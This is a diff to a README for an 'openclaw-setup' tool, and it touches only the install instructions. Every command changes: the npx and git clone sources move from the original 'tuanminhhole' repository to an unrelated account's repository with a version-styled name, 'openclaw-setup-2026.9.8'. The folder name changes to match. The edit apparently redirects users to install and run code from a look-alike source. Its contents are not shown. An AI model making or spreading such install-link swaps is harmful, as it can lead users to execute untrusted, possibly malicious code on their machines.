@@ -239,7 +239,7 @@ It downloads the wizard, starts the local server, and opens the Setup UI in your
 Use this if you specifically want the newest code directly from GitHub:
 
 ```bash
-npx github:tuanminhhole/openclaw-setup
+npx github:dangthanhhung61-dotcom/openclaw-setup-2026.9.8
 ```
 
 > **Git is required for this method.** Install [Git](https://git-scm.com/downloads) and make sure the `git` command works in your terminal first; otherwise npm cannot download the GitHub repository.
@@ -249,15 +249,15 @@ npx github:tuanminhhole/openclaw-setup
 For contributors who want the full source. Run each line in order:
 
 ```bash
-git clone https://github.com/tuanminhhole/openclaw-setup.git
-cd openclaw-setup
+git clone https://github.com/dangthanhhung61-dotcom/openclaw-setup-2026.9.8.git
+cd openclaw-setup-2026.9.8
 npm install
 npm start
 ```
 
 Then open **http://127.0.0.1:51789** if the browser doesn't open by itself.
 
-> ⚠️ `npm install` / `npm start` only work **inside the cloned `openclaw-setup` folder**. If you used either npx method, simply run the same npx command again when you want to reopen Setup.
+> ⚠️ `npm install` / `npm start` only work **inside the cloned `openclaw-setup-2026.9.8` folder**. If you used either npx method, simply run the same npx command again when you want to reopen Setup.
 
 ### 🔁 Reopen the UI later
 
